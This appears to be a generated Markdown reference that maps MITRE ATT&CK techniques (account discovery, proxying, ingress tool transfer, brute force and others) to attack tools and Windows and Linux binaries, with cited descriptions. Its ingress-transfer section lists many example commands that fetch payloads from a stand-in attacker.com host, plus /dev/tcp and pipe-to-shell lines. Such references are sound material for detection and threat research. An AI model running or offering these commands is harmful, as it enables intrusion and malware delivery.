- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use LDAP queries, `net group "Domain Admins" /domain` and `net user /domain` for discovery.(Citation: Palo Alto Brute Ratel July 2022)(Citation: Trend Micro Black Basta October 2022)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can enumerate the domain user accounts on a targeted system.(Citation: CME Github September 2018)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can acquire local and domain user account information.(Citation: Github PowerShell Empire)(Citation: SecureWorks August 2019)
- [Net](../tools/unknown/net.md) — explicit, source. [Net](https://attack.mitre.org/software/S0039) commands used with the <code>/domain</code> flag can be used to gather information about and manipulate user accounts on the current domain.(Citation: Microsoft Net)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can enumerate local and domain user account information.(Citation: GitHub PoshC2)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can use `System.Security.AccessControl` namespaces to retrieve domain user information.(Citation: GitHub SILENTTRINITY Modules July 2019)  
- [dsquery](../tools/unknown/dsquery.md) — explicit, source. [dsquery](https://attack.mitre.org/software/S0105) can be used to gather information on user accounts within a domain.(Citation: TechNet Dsquery)(Citation: Mandiant APT41)

## T1087.003 - Email Account

- [MailSniper](../tools/unknown/mailsniper.md) — explicit, source. [MailSniper](https://attack.mitre.org/software/S0413) can be used to obtain account names from Exchange and Office 365 using the <code>Get-GlobalAddressList</code> cmdlet.(Citation: Black Hills Attacking Exchange MailSniper, 2016)
- [Ruler](../tools/unknown/ruler.md) — explicit, source. [Ruler](https://attack.mitre.org/software/S0358) can be used to enumerate Exchange users and dump the GAL.(Citation: SensePost Ruler GitHub)

## T1087.004 - Cloud Account

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can enumerate Azure AD users.(Citation: AADInternals Documentation)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can enumerate IAM users, roles, and groups. (Citation: GitHub Pacu)
- [ROADTools](../tools/unknown/roadtools.md) — explicit, source. [ROADTools](https://attack.mitre.org/software/S0684) can enumerate Azure AD users.(Citation: Roadtools)

## T1090 - Proxy

- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) can proxy communications through a server in public IP space to local servers located behind a NAT or firewall.(Citation: FRP GitHub)
- [HTRAN](../tools/unknown/htran.md) — explicit, source. [HTRAN](https://attack.mitre.org/software/S0040) can proxy TCP socket connections to obfuscate command and control infrastructure.(Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains modules that allow for use of proxies in command and control.(Citation: GitHub PoshC2)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can communicate over a reverse proxy using SOCKS5.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.(Citation: Riskiq Remcos Jan 2018)(Citation: Fortinet Remcos Campaign NOV 2024)
- [netsh](../tools/unknown/netsh.md) — explicit, source. [netsh](https://attack.mitre.org/software/S0108) can be used to set up a proxy tunnel to allow remote host access to an infected host.(Citation: Securelist fileless attacks Feb 2017)
- [ngrok](../tools/unknown/ngrok.md) — explicit, source. [ngrok](https://attack.mitre.org/software/S0508) can be used to proxy connections to machines located behind NAT or firewalls.(Citation: MalwareBytes Ngrok February 2020)(Citation: Zdnet Ngrok September 2018)

## T1090.001 - Internal Proxy

- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) can leverage a peer-to-peer C2 profile between agents.(Citation: Mythc Documentation)		
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) has a built-in SOCKS5 proxying capability allowing for [Sliver](https://attack.mitre.org/software/S0633) clients to proxy network traffic through other clients within a victim network.(Citation: Cybereason Sliver Undated)

## T1090.002 - External Proxy

- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) can leverage a modified SOCKS5 proxy to tunnel egress C2 traffic.(Citation: Mythc Documentation)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can route traffic via SOCKS5 and HTTP(S) proxies between an intended phishing victim's machine and legitimate websites.(Citation: Evilginx 2 July 2018)(Citation: Breakdev Evilginx 2.4 SEP 2020)(Citation: Sophos Evilginx MAR 2025)


## T1090.003 - Multi-hop Proxy

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can proxy C2 through a [Tor](https://attack.mitre.org/software/S0183) client.(Citation: ESET MirrorFace 2025)
- [FRP](../tools/unknown/frp.md) — explicit, source. The [FRP](https://attack.mitre.org/software/S1144) client can be configured to connect to the server through a proxy.(Citation: FRP GitHub)
- [Tor](../tools/unknown/tor.md) — explicit, source. Traffic traversing the [Tor](https://attack.mitre.org/software/S0183) network will be forwarded to multiple nodes before exiting the [Tor](https://attack.mitre.org/software/S0183) network and continuing on to its intended destination.(Citation: Dingledine Tor The Second-Generation Onion Router)

## T1090.004 - Domain Fronting

- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports domain fronting via custom request headers.(Citation: Mythc Documentation)	
- [meek](../tools/unknown/meek.md) — explicit, source. [meek](https://attack.mitre.org/software/S0175) uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination.

## T1095 - Non-Application Layer Protocol

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has the ability to use TCP for external C2.(Citation: Palo Alto Brute Ratel July 2022)
- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) can communicate over TCP, TCP stream multiplexing, KERN Communications Protocol (KCP), QUIC, and UDP.(Citation: FRP GitHub)
- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports WebSocket and TCP-based C2 profiles.(Citation: Mythc Documentation)	
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can use TCP for C2 communication.(Citation: CISA AR18-352A Quasar RAT December 2018)

## T1098 - Account Manipulation

- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. The [Mimikatz](https://attack.mitre.org/software/S0002) credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The <code>LSADUMP::ChangeNTLM</code> and <code>LSADUMP::SetNTLM</code> modules can also manipulate the password hash of an account without knowing the clear text value.(Citation: Adsecurity Mimikatz Guide)(Citation: Metcalf 2015)

## T1098.001 - Additional Cloud Credentials

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users.(Citation: GitHub Pacu)

## T1098.005 - Device Registration

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can register a device to Azure AD.(Citation: AADInternals Documentation)

## T1098.007 - Additional Local or Domain Groups

- [Net](../tools/unknown/net.md) — explicit, source. The `net localgroup` and `net group` commands in [Net](https://attack.mitre.org/software/S0039) can be used to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup) (Citation: Microsoft Net Group)

## T1102 - Web Service

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use legitimate websites for external C2 channels including Slack, Discord, and MS Teams.(Citation: Palo Alto Brute Ratel July 2022)
- [ngrok](../tools/unknown/ngrok.md) — explicit, source. [ngrok](https://attack.mitre.org/software/S0508) has been used by threat actors to proxy C2 connections to ngrok service subdomains.(Citation: Zdnet Ngrok September 2018)

## T1102.002 - Bidirectional Communication

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use Dropbox and GitHub for C2.(Citation: Github PowerShell Empire)

## T1105 - Ingress Tool Transfer

- [AppInstaller.exe](../tools/windows/appinstaller.exe.md) — explicit, source. Command metadata lists T1105: start ms-appinstaller://?source={REMOTEURL:.exe}
- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) has the ability to download files including over SFTP.(Citation: AsyncRAT GitHub)(Citation: ESET MirrorFace 2025)
- [BITSAdmin](../tools/unknown/bitsadmin.md) — explicit, source. [BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload and/or download files.(Citation: Microsoft BITSAdmin)
- [Bcp.exe](../tools/windows/bcp.exe.md) — explicit, source. Command metadata lists T1105: bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
- [Bitsadmin.exe](../tools/windows/bitsadmin.exe.md) — explicit, source. Command metadata lists T1105: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. 
[Brute Ratel C4](https://attack.mitre.org/software/S1063) can download files to compromised hosts.(Citation: Palo Alto Brute Ratel July 2022)(Citation: Rapid7 Fake W2 July 2024)
- [CARROTBALL](../tools/unknown/carrotball.md) — explicit, source. [CARROTBALL](https://attack.mitre.org/software/S0465) has the ability to download and install a remote payload.(Citation: Unit 42 CARROTBAT January 2020)
- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) can download additional tools to a compromised host.(Citation: Cybereason Kimsuky November 2020)
- [CertOC.exe](../tools/windows/certoc.exe.md) — explicit, source. Command metadata lists T1105: certoc.exe -GetCACAPS {REMOTEURL:.ps1}
- [CertReq.exe](../tools/windows/certreq.exe.md) — explicit, source. Command metadata lists T1105: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
- [Certutil.exe](../tools/windows/certutil.exe.md) — explicit, source. Command metadata lists T1105: certutil.exe -URL {REMOTEURL:.exe}
- [Cmd.exe](../tools/windows/cmd.exe.md) — explicit, source. Command metadata lists T1105: type {PATH_SMB} > {PATH_ABSOLUTE}
- [ConfigSecurityPolicy.exe](../tools/windows/configsecuritypolicy.exe.md) — explicit, source. Command metadata lists T1105: ConfigSecurityPolicy.exe {REMOTEURL}
- [Desktopimgdownldr.exe](../tools/windows/desktopimgdownldr.exe.md) — explicit, source. Command metadata lists T1105: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
- [Diantz.exe](../tools/windows/diantz.exe.md) — explicit, source. Command metadata lists T1105: diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can download and execute previously staged shellcode payloads.(Citation: Donut Github)
- [ECMangen.exe](../tools/windows/ecmangen.exe.md) — explicit, source. Command metadata lists T1105: ECMangen.exe {REMOTEURL}
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can upload and download to and from a victim machine.(Citation: Github PowerShell Empire)
- [Esentutl.exe](../tools/windows/esentutl.exe.md) — explicit, source. Command metadata lists T1105: esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o
- [Excel.exe](../tools/windows/excel.exe.md) — explicit, source. Command metadata lists T1105: Excel.exe {REMOTEURL}
- [Expand.exe](../tools/windows/expand.exe.md) — explicit, source. Command metadata lists T1105: expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}
- [Extrac32.exe](../tools/windows/extrac32.exe.md) — explicit, source. Command metadata lists T1105: extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}
- [Findstr.exe](../tools/windows/findstr.exe.md) — explicit, source. Command metadata lists T1105: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
- [Finger.exe](../tools/windows/finger.exe.md) — explicit, source. Command metadata lists T1105: finger user@example.host.com | more +2 | cmd
- [Ftp.exe](../tools/windows/ftp.exe.md) — explicit, source. Command metadata lists T1105: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.tx...
- [GfxDownloadWrapper.exe](../tools/windows/gfxdownloadwrapper.exe.md) — explicit, source. Command metadata lists T1105: C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
- [Hh.exe](../tools/windows/hh.exe.md) — explicit, source. Command metadata lists T1105: HH.exe {REMOTEURL:.bat}
- [IMEWDBLD.exe](../tools/windows/imewdbld.exe.md) — explicit, source. Command metadata lists T1105: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
- [Ieexec.exe](../tools/windows/ieexec.exe.md) — explicit, source. Command metadata lists T1105: ieexec.exe {REMOTEURL:.exe}
- [Installutil.exe](../tools/windows/installutil.exe.md) — explicit, source. Command metadata lists T1105: InstallUtil.exe {REMOTEURL}
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can download additional files and tools.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021)
- [Ldifde.exe](../tools/windows/ldifde.exe.md) — explicit, source. Command metadata lists T1105: Ldifde -i -f {PATH:.ldf}
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) can upload additional files to a compromised host.(Citation: Secureworks MCMD July 2019)
- [MSAccess.exe](../tools/windows/msaccess.exe.md) — explicit, source. Command metadata lists T1105: MSAccess.exe {REMOTEURL}
- [Makecab.exe](../tools/windows/makecab.exe.md) — explicit, source. Command metadata lists T1105: makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
- [MpCmdRun.exe](../tools/windows/mpcmdrun.exe.md) — explicit, source. Command metadata lists T1105: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platfor...
- [Msdeploy.exe](../tools/windows/msdeploy.exe.md) — explicit, source. Command metadata lists T1105: msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}
- [Msedge.exe](../tools/windows/msedge.exe.md) — explicit, source. Command metadata lists T1105: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
- [Mshta.exe](../tools/windows/mshta.exe.md) — explicit, source. Command metadata lists T1105: mshta.exe {REMOTEURL}
- [MsoHtmEd.exe](../tools/windows/msohtmed.exe.md) — explicit, source. Command metadata lists T1105: MsoHtmEd.exe {REMOTEURL}
- [Mspub.exe](../tools/windows/mspub.exe.md) — explicit, source. Command metadata lists T1105: mspub.exe {REMOTEURL}
- [Ngen.exe](../tools/windows/ngen.exe.md) — explicit, source. Command metadata lists T1105: ngen.exe {REMOTEURL}
- [OneDriveStandaloneUpdater.exe](../tools/windows/onedrivestandaloneupdater.exe.md) — explicit, source. Command metadata lists T1105: OneDriveStandaloneUpdater
- [PhotoViewer.dll](../tools/windows/photoviewer.dll.md) — explicit, source. Command metadata lists T1105: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
- [Powerpnt.exe](../tools/windows/powerpnt.exe.md) — explicit, source. Command metadata lists T1105: Powerpnt.exe {REMOTEURL}
- [Presentationhost.exe](../tools/windows/presentationhost.exe.md) — explicit, source. Command metadata lists T1105: Presentationhost.exe {REMOTEURL}
- [Print.exe](../tools/windows/print.exe.md) — explicit, source. Command metadata lists T1105: print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
- [PrintBrm.exe](../tools/windows/printbrm.exe.md) — explicit, source. Command metadata lists T1105: PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
- [ProtocolHandler.exe](../tools/windows/protocolhandler.exe.md) — explicit, source. Command metadata lists T1105: ProtocolHandler.exe {REMOTEURL}
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can upload and download to/from a victim machine.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can download files to the victim’s machine and execute them.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can upload and download files to and from the victim’s machine.(Citation: Riskiq Remcos Jan 2018)(Citation: Fortinet Remcos Campaign NOV 2024)
- [RemoteUtilities](../tools/unknown/remoteutilities.md) — explicit, source. [RemoteUtilities](https://attack.mitre.org/software/S0592) can upload and download files to and from a target machine.(Citation: Trend Micro Muddy Water March 2021)
- [Replace.exe](../tools/windows/replace.exe.md) — explicit, source. Command metadata lists T1105: replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can load additional files and tools, including [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub SILENTTRINITY Modules July 2019)
- [Scrobj.dll](../tools/windows/scrobj.dll.md) — explicit, source. Command metadata lists T1105: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) had the ability to download additional payloads.(Citation: FOX-IT May 2016 Mofang)
- [Shimgvw.dll](../tools/windows/shimgvw.dll.md) — explicit, source. Command metadata lists T1105: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can download additional content and files from the [Sliver](https://attack.mitre.org/software/S0633) server to the client residing on the victim machine using the <code>upload</code> command.(Citation: GitHub Sliver Upload)(Citation: Cybereason Sliver Undated)
- [Tar.exe](../tools/windows/tar.exe.md) — explicit, source. Command metadata lists T1105: tar -xf {PATH_SMB:.tar}
- [VSLaunchBrowser.exe](../tools/windows/vslaunchbrowser.exe.md) — explicit, source. Command metadata lists T1105: VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
- [Visio.exe](../tools/windows/visio.exe.md) — explicit, source. Command metadata lists T1105: Visio.exe {REMOTEURL}
- [WinProj.exe](../tools/windows/winproj.exe.md) — explicit, source. Command metadata lists T1105: WinProj.exe {REMOTEURL}
- [Winword.exe](../tools/windows/winword.exe.md) — explicit, source. Command metadata lists T1105: winword.exe {REMOTEURL}
- [Wmic.exe](../tools/windows/wmic.exe.md) — explicit, source. Command metadata lists T1105: wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
- [Wsl.exe](../tools/windows/wsl.exe.md) — explicit, source. Command metadata lists T1105: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
- [Xwizard.exe](../tools/windows/xwizard.exe.md) — explicit, source. Command metadata lists T1105: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
- [ab](../tools/linux/ab.md) — inferred, high. Command appears to retrieve a remote file: ab -v2 http://attacker.com/path/to/input-file
- [aria2c](../tools/linux/aria2c.md) — inferred, high. Command appears to retrieve a remote file: echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
- [certutil](../tools/unknown/certutil.md) — explicit, source. [certutil](https://attack.mitre.org/software/S0160) can be used to download files from a given URL.(Citation: TechNet Certutil)(Citation: LOLBAS Certutil)
- [cmd](../tools/unknown/cmd.md) — explicit, source. [cmd](https://attack.mitre.org/software/S0106) can be used to copy files to/from a remotely connected external system.(Citation: TechNet Copy)
- [cmdl32.exe](../tools/windows/cmdl32.exe.md) — explicit, source. Command metadata lists T1105: cmdl32 /vpn /lan %cd%\config
- [curl](../tools/linux/curl.md) — inferred, high. Command appears to retrieve a remote file: curl http://attacker.com/path/to/input-file -o /path/to/output-file
- [devtunnel.exe](../tools/windows/devtunnel.exe.md) — explicit, source. Command metadata lists T1105: devtunnel.exe host -p 8080
- [dtutil.exe](../tools/windows/dtutil.exe.md) — explicit, source. Command metadata lists T1105: dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}
- [esentutl](../tools/unknown/esentutl.md) — explicit, source. [esentutl](https://attack.mitre.org/software/S0404) can be used to copy files from a given URL.(Citation: LOLBAS Esentutl)
- [ftp](../tools/unknown/ftp.md) — explicit, source. [ftp](https://attack.mitre.org/software/S0095) may be abused by adversaries to transfer tools or files from an external system into a compromised environment.(Citation: Microsoft FTP)(Citation: Linux FTP)
- [jjs](../tools/linux/jjs.md) — inferred, high. Command appears to retrieve a remote file: jjs var URL = Java.type('java.net.URL'); var ws = new URL('http://attacker.com/path/to/input-file'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.n...
- [jrunscript](../tools/linux/jrunscript.md) — inferred, high. Command appears to retrieve a remote file: jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
- [julia](../tools/linux/julia.md) — inferred, high. Command appears to retrieve a remote file: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
- [kubectl](../tools/linux/kubectl.md) — inferred, high. Command appears to retrieve a remote file: cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users: - name: x user: exec: apiV...
- [lwp-download](../tools/linux/lwp-download.md) — inferred, high. Command appears to retrieve a remote file: lwp-download http://attacker.com/path/to/input-file /path/to/output-file
- [msedge_proxy.exe](../tools/windows/msedge-proxy.exe.md) — explicit, source. Command metadata lists T1105: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
- [msxsl.exe](../tools/windows/msxsl.exe.md) — explicit, source. Command metadata lists T1105: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
- [node](../tools/linux/node.md) — inferred, high. Command appears to retrieve a remote file: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
- [php](../tools/linux/php.md) — inferred, high. Command appears to retrieve a remote file: php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
- [python](../tools/linux/python.md) — inferred, high. Command appears to retrieve a remote file: python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve("http://attacker.com/path/to...
- [restic](../tools/linux/restic.md) — inferred, high. Command appears to retrieve a remote file: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
- [ruby](../tools/linux/ruby.md) — inferred, high. Command appears to retrieve a remote file: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
- [wget](../tools/linux/wget.md) — inferred, high. Command appears to retrieve a remote file: wget http://attacker.com/path/to/input-file -O /path/to/output-file
- [winget.exe](../tools/windows/winget.exe.md) — explicit, source. Command metadata lists T1105: winget.exe install --accept-package-agreements -s msstore {name or ID}
- [winrm.vbs](../tools/windows/winrm.vbs.md) — inferred, high. Command appears to retrieve a remote file: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
- [xsd.exe](../tools/windows/xsd.exe.md) — explicit, source. Command metadata lists T1105: xsd.exe {REMOTEURL}
- [yt-dlp](../tools/linux/yt-dlp.md) — inferred, high. Command appears to retrieve a remote file: yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
- [yum](../tools/linux/yum.md) — inferred, high. Command appears to retrieve a remote file: yum install http://attacker.com/path/to/input-file.rpm

## T1106 - Native API

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) has the ability to use OS APIs including `CheckRemoteDebuggerPresent`.(Citation: Telefonica Snip3 December 2021)
- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.(Citation: GitHub Bloodhound)
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can call multiple Windows APIs for execution, to share memory, and defense evasion.(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) code modules use various API functions to load and inject code.(Citation: Donut Github)	
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains a variety of enumeration modules that have an option to use API calls to carry out tasks.(Citation: Github PowerShell Empire)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has leveraged CreateProcessW() call to execute the debugger.(Citation: QiAnXin APT-C-36 Feb2019)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has used a variety of Windows API functions.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) has the ability to leverage API including `GetProcAddress` and `LoadLibrary`.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) used several Windows API functions to gather information from the infected system.(Citation: FOX-IT May 2016 Mofang)

## T1110 - Brute Force

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can brute force supplied user credentials across a network range.(Citation: CME Github September 2018)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) has modules for brute forcing local administrator and AD user accounts.(Citation: GitHub PoshC2)

## T1110.001 - Password Guessing

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can brute force passwords for a specified user on a single target system or across an entire network.(Citation: CME Github September 2018)

## T1110.003 - Password Spraying

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can brute force credential authentication by using a supplied list of usernames and a single password.(Citation: CME Github September 2018)
- [MailSniper](../tools/unknown/mailsniper.md) — explicit, source. [MailSniper](https://attack.mitre.org/software/S0413) can be used for password spraying against Exchange and Office 365.(Citation: GitHub MailSniper)

## T1111 - Multi-Factor Authentication Interception

- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can intercept authentication tokens to enable bypass of non-phishing resistant forms of MFA.(Citation: Evilginx 2 July 2018)

## T1112 - Modify Registry

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can modify registry keys as part of setting a new pass-through authentication agent.(Citation: AADInternals Documentation)
- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) can write to the Registry under the <code>%windir%</code> variable to execute tasks.(Citation: Cybereason Kimsuky November 2020)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can create a registry key using wdigest.(Citation: CME Github September 2018)
- [NPPSPY](../tools/unknown/nppspy.md) — explicit, source. [NPPSPY](https://attack.mitre.org/software/S1131) modifies the Registry to record the malicious listener for output from the Winlogon process.(Citation: Huntress NPPSPY 2022)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can delete its persistence mechanisms from the registry.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) has a command to edit the Registry on the victim’s machine.(Citation: GitHub QuasarRAT)(Citation: CISA AR18-352A Quasar RAT December 2018)
